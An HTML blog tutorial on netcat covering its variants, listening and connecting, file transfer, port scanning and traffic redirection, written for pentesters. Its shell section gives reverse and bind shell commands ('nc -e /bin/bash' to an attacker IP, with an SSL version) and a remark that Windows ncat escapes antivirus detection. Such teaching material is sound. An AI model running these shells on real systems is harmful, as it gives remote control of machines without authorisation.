@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Netcat - All you need to know :: ikuamike</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://blog.ikuamike.io/posts/2021/netcat/" />
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-202973704-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-202973704-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.ikuamike.io/img/netcat/netcat.png"/>
+
+<meta name="twitter:title" content="Netcat - All you need to know"/>
+<meta name="twitter:description" content=""/>
+<meta name="twitter:site" content="@ikuamike"/>
+
+
+
+<link rel="stylesheet" href="https://blog.ikuamike.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://blog.ikuamike.io/assets/green.css">
+
+
+
+<link rel="stylesheet" href="https://blog.ikuamike.io/style.css">
+
+
+<link rel="apple-touch-icon" href="https://blog.ikuamike.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://blog.ikuamike.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:creator" content="@ikuamike"/>
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Netcat - All you need to know">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://blog.ikuamike.io/posts/2021/netcat/" />
+<meta property="og:site_name" content="ikuamike" />
+
+  <meta property="og:image" content="https://blog.ikuamike.io/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-07-08 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    &gt; cd ~
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About Me</a></li>
+        
+      
+        
+          <li><a href="/all-posts">All Posts</a></li>
+        
+      
+        
+          <li><a href="/tags">Tags</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/webinars">Webinars</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About Me</a></li>
+      
+    
+      
+        <li><a href="/all-posts">All Posts</a></li>
+      
+    
+      
+        <li><a href="/tags">Tags</a></li>
+      
+    
+      
+        <li><a href="/webinars">Webinars</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://blog.ikuamike.io/posts/2021/netcat/">Netcat - All you need to know</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-07-08 
+      </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://blog.ikuamike.io/tags/netcat/">Netcat</a>&nbsp;
+    
+    #<a href="https://blog.ikuamike.io/tags/ncat/">Ncat</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#variants">Variants</a>
+      <ul>
+        <li><a href="#netcat-traditional">Netcat Traditional</a></li>
+        <li><a href="#gnu-netcat">GNU Netcat</a></li>
+        <li><a href="#netcat-openbsd">Netcat OpenBSD</a></li>
+        <li><a href="#ncat">Ncat</a></li>
+      </ul>
+    </li>
+    <li><a href="#features">Features</a>
+      <ul>
+        <li><a href="#server--client-mode">Server / Client mode</a></li>
+        <li><a href="#reverse--bind-shells">Reverse / Bind Shells</a></li>
+        <li><a href="#file-transfer">File Transfer</a></li>
+        <li><a href="#port-scanning">Port Scanning</a></li>
+        <li><a href="#traffic-redirection">Traffic Redirection</a></li>
+        <li><a href="#ncat-additional-features">Ncat Additional Features</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <img src="/img/netcat/netcat.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. Netcat has been referred to as the TCP/IP / networking swiss army knife.
+In this article we&rsquo;ll look at different applications of netcat and how it can be useful in day to day activities of a pentester, security professional, sysadmin etc&hellip;</p>
+<p>If you would like to test out these commands in a lab environment without the need to install them on your own machine have a look at my scenario on <a href="https://app.cyberranges.com" target="_blank" rel="noopener"><strong>CYBERRANGES</strong></a>
+
+ using the
+link below.</p>
+<p><a href="https://app.cyberranges.com/scenario/60e782766596fe0006aeceb8" target="_blank" rel="noopener">Netcat Scenario</a>
+
+</p>
+<h2 id="variants">Variants<a href="#variants" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>There are several variants of netcat but most of the core functionality and command line options are very similar. Netcat having being initially written for Unix,
+the variants we will look at are linux based. You can also find netcat ports for windows that support similar commands to what we&rsquo;ll look at.</p>
+<h3 id="netcat-traditional">Netcat Traditional<a href="#netcat-traditional" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Netcat traditional is the original implementation and was written by a guy known as Hobbit. This does not typically come preinstalled unless you are using a distro like kali linux. It is no
+longer maintained and is on version 1.10.</p>
+<p>By running <code>apt search netcat</code> on an ubuntu/debian based machine, it appears as netcat or netcat-traditional.</p>
+
+  <img src="/img/netcat/netcat-1.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>To install it you can then run <code>sudo apt install netcat-traditional</code> or via compiling from source which you can get from the project page <a href="https://nc110.sourceforge.io/">https://nc110.sourceforge.io/</a>.</p>
+<p>If you install the different variants of netcat on your system you may have to invoke the command with the full binary name. In this case we&rsquo;ll run <code>nc.traditional -h</code> to see the command line
+options.</p>
+
+  <img src="/img/netcat/netcat-4.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>You notice the -e option, this is not available in the openbsd version. This is the feature that is considered a security hole. More on this when we get to the shells section.</p>
+<h3 id="gnu-netcat">GNU Netcat<a href="#gnu-netcat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>GNU Netcat is a rewrite of the original netcat to make it more portable with new features and fully GNU compliant. This means it can be easily installed on almost all linux distros.
+This version is not available via package manager. It seems to also be no longer maintained as it&rsquo;s latest version is 0.7.1 from 2004.</p>
+<p>To get it you can download the source files from the project website <a href="http://netcat.sourceforge.net">http://netcat.sourceforge.net</a> then compile it.</p>
+<p>You need gcc and make to install successfully. The binary will be installed to /usr/local/bin/netcat. Below are the commands to use.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cd netcat-0.7.1/
+./configure
+make
+sudo make install
+</code></pre></div>
+  <img src="/img/netcat/netcat-5.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="netcat-openbsd">Netcat OpenBSD<a href="#netcat-openbsd" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The Netcat OpenBSD version is a rewrite of the original netcat to include support for IPv6, proxies and unix sockets. In addition to those enhancements it is compiled to remove a feature that
+is considered a gaping security hole of the application.</p>
+<p>This version is the most common and is what you will find installed by default in ubuntu distro (both desktop and server). For other linux distros you may have to install it yourself.</p>
+<p>By running <code>apt search netcat</code> on an ubuntu machine, it appears as netcat-openbsd package.</p>
+<p>To install it you can then run <code>sudo apt install netcat-openbsd</code>. When netcat is installed it is symlinked to nc and netcat for ease of invoking the command. We can see this
+by checking the realpath of nc and netcat, they point to the same nc.openbsd binary. This can be different depending on which variant you have installed in your system.</p>
+
+  <img src="/img/netcat/netcat-3.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The command line options available can be seen by running <code>netcat -h</code>.</p>
+
+  <img src="/img/netcat/netcat-2.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="ncat">Ncat<a href="#ncat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Ncat is the reimplementation of netcat from the nmap project. This version is more feature rich and improved. I personally use this on a day to day.</p>
+<p>When installing nmap you get ncat installed as well, this applies for windows and linux. You can then run <code>ncat -h</code> to see the command line options available.</p>
+
+  <img src="/img/netcat/netcat-6.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>You can also compile from source to install it which can be downloaded from the nmap website <a href="https://nmap.org/ncat/">https://nmap.org/ncat/</a>.</p>
+<h2 id="features">Features<a href="#features" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now that we understand the different variants, let&rsquo;s look at the most common features you&rsquo;d use netcat for. Most of the syntax is common across the different
+variants.</p>
+<p>We&rsquo;ll focus on the 2 most recent variants, <em>netcat-openbsd</em> and <em>ncat</em> because they are the most recently maintained and updated.</p>
+<h3 id="server--client-mode">Server / Client mode<a href="#server--client-mode" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>Server mode</strong></p>
+<p>In server mode you can use netcat to listen for connections. What this does is open a port (either tcp or udp) on the system.</p>
+<p>By default netcat listens on tcp. The below command will listen on all interfaces on port 8080.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -lvnp <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>To specify the interface to listen on, for example localhost, you can use the below syntax for openbsd variant. Sometimes it may not be the best idea to
+listen on all interfaces depending on the situation.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -s 127.0.0.1 -lvnp <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>Ncat prefers a different syntax when specifying the interface.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ncat -lvn 127.0.0.1 <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>To listen on udp the syntax is similar to tcp but including -u option.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -l -u -v -n -p <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>As you noticed, the command line options can be used grouped together or separated.</p>
+<p><strong>Client mode</strong></p>
+<p>In client mode you can use netcat to connect to an open port on a system. This can be beneficial for manually checking service
+banners or just checking if the port is open.</p>
+<p>For a tcp connection when connecting to IP 127.0.0.1 on port 8080, the syntax is as below.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -vn 127.0.0.1 <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>For a udp connection we only add the -u option.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -uvn 127.0.0.1 <span style="color:#ae81ff">8080</span>
+</code></pre></div><h3 id="reverse--bind-shells">Reverse / Bind Shells<a href="#reverse--bind-shells" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Familiarity with the concept of reverse shells and bind shells is needed as it is not discussed in detail in this section as we are
+only looking at how netcat facilitates them.</p>
+<p>This is very popular to pentesters and use of netcat makes it easy. I will use the server / client model for explanation.</p>
+<p>The commands used only work on ncat,netcat traditional and gnu netcat. Netcat OpenBSD is compiled to not have this feature as it is
+considered a security risk.</p>
+<p><strong>Reverse shells</strong></p>
+<p>For a reverse shell, we use netcat in server mode to listen for connections then supply the shell from the client. This will allow
+the session on the server to run commands on the client once the shell is received. From a pentesting perspective the server would be
+the attacker machine and the client the victim machine.</p>
+<p>Server (attacker machine)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -lvnp <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>Client (victim machine)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -e /bin/bash 192.168.125.10 <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>Something to note is that, just because the openbsd version does not have this -e option, does not mean that it is impossible to get a reverse
+shell when it&rsquo;s installed. There are still ways it can be used to achieve a reverse shell.</p>
+<p><strong>Bind shells</strong></p>
+<p>For a bind shell, netcat in server mode listens for a connection and serves the shell process to any connecting client. Netcat running in
+client mode can then connect to the server and get shell access to the server and run commands. From a pentesting perspective the server
+would be the victim machine and the client the attacker machine.</p>
+<p>Server (victim machine)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -e /bin/bash -lvnp <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>Client (attacker machine)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc 192.168.125.10 <span style="color:#ae81ff">8080</span>
+</code></pre></div><h3 id="file-transfer">File Transfer<a href="#file-transfer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Due to the ability to write to the connections raw, we can transfer files over the connection from one system to another without distortion.</p>
+<p>For this we don&rsquo;t really care about which is the server and which is the client because the transfer can go either direction but we need
+to run the listener first.</p>
+<p>To transfer a file on server1 to server2 over port 8080 can be done as below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -lvnp <span style="color:#ae81ff">8080</span> &lt; infile   <span style="color:#f92672">(</span>server1<span style="color:#f92672">)</span>
+nc 192.168.125.10 <span style="color:#ae81ff">8080</span> &gt; outfile  <span style="color:#f92672">(</span>server2<span style="color:#f92672">)</span>
+</code></pre></div><p>To do the same in the opposite direction:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc 192.168.125.20 <span style="color:#ae81ff">8080</span> &lt; infile <span style="color:#f92672">(</span>server1<span style="color:#f92672">)</span>
+nc -lvnp <span style="color:#ae81ff">8080</span> &gt; outfile <span style="color:#f92672">(</span>server2<span style="color:#f92672">)</span>
+</code></pre></div><h3 id="port-scanning">Port Scanning<a href="#port-scanning" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>This feature is not implemented in ncat but is available in the other variants. According to their website they omitted this feature because
+they have a better tool for that, which would be nmap.</p>
+<p>Therefore if you find a system with netcat-openbsd and can&rsquo;t install nmap you can run basic port scans as below.</p>
+<p>To scan TCP ports on a target we can use the below syntax.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -nvv -w <span style="color:#ae81ff">1</span> -z 127.0.0.1 1-1000
+</code></pre></div><p>To scan UDP ports on a target we can use the below syntax.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -nvv -w <span style="color:#ae81ff">1</span> -z -u 127.0.0.1 1-1000
+</code></pre></div><h3 id="traffic-redirection">Traffic Redirection<a href="#traffic-redirection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>This is only possible on the variants that support the -e option.</p>
+<p>Take the below scenario where server1 cannot connect directly to server3 but can only go through server2.</p>
+<pre><code>server1 &lt;-------------&gt; server2 &lt;-------------&gt; server3
+</code></pre><p>To redirect traffic from server1 to a web app running on server3 (192.168.125.40) on port 8080 we can execute the below ncat command on server2.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -klvnp <span style="color:#ae81ff">8000</span> -e <span style="color:#e6db74">&#34;/bin/nc 192.168.125.40 8080&#34;</span>
+</code></pre></div><p>Now you can reach the web app on server3 by accessing server2 on port 8000.</p>
+<h3 id="ncat-additional-features">Ncat Additional Features<a href="#ncat-additional-features" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>From the features the security risks can be seen because there&rsquo;s no encryption on the connection as netcat will write to the connection in its
+rawest form, therefore anyone sniffing the network can capture all your traffic unencrypted in the case of shells and file transfer. For bind shells,
+there&rsquo;s no authentication therefore anyone connecting to the port the bind shell is listening on will be able to run commands on the machine.</p>
+<p>When using ncat, some of these concerns are addressed as it allows for use of ssl as well as access control.</p>
+<p><strong>Encrypted Shells</strong></p>
+<p>For a reverse shell we&rsquo;ll use the same command syntax but add <code>--ssl</code> to the command, same goes for bind shells.</p>
+<p>Server (attacker machine)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc --ssl -lvnp <span style="color:#ae81ff">8080</span>
+</code></pre></div><p>Client (victim machine)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc --ssl -e /bin/bash 192.168.125.10 <span style="color:#ae81ff">8080</span>
+</code></pre></div><p><strong>Access Control</strong></p>
+<p>When using netcat in server mode the <code>--allow</code> option can specify one host or network range to be allowed to connect to the port, this can be good
+for the bind shell situation. Similarly, you can use &ndash;deny to deny access from a specific host or network range.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc --allow 127.0.0.1 -e /bin/bash -lvnp <span style="color:#ae81ff">8000</span>
+</code></pre></div><p>The above command will set the bind shell to only accept connections from localhost.</p>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Netcat is a really great tool for network related activities, I find it really useful during CTFs and sometimes use it during pentests. There&rsquo;s several other options that
+we haven&rsquo;t looked into feel free to explore them, but I think we&rsquo;ve covered should be enough for most of your use cases.</p>
+<p>I haven&rsquo;t explained the specific command line options -like -v -n because the help menu clearly explains them.</p>
+<p>Challenge for you, play around with netcat for windows (specifically ncat because of ssl feature). It&rsquo;s a nice utility that can help you get reverse shells and doesn&rsquo;t get flagged as a virus.</p>
+<p>Happy Hacking!</p>
+<h2 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><a href="https://en.wikipedia.org/wiki/Netcat">https://en.wikipedia.org/wiki/Netcat</a></p>
+<p><a href="https://nmap.org/ncat/guide/index.html">https://nmap.org/ncat/guide/index.html</a></p>
+<p><a href="http://netcat.sourceforge.net/">http://netcat.sourceforge.net/</a></p>
+<p><a href="https://nc110.sourceforge.io/">https://nc110.sourceforge.io/</a></p>
+<p><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://blog.ikuamike.io/posts/2021/package_managers_privesc/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Linux Privilege Escalation - Package Managers</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://blog.ikuamike.io/posts/2021/sar1/">
+                <span class="button__text">Vulnhub: Sar 1</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© Michael Ikua</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://blog.ikuamike.io/assets/main.js"></script>
+<script src="https://blog.ikuamike.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>
+addBackToTop({
+  diameter: 40,
+  backgroundColor: 'rgb(120, 226, 160)',
+  textColor: '#1F222A',
+  cornerOffset: 30
+})
+</script>
+</body>
+</html>
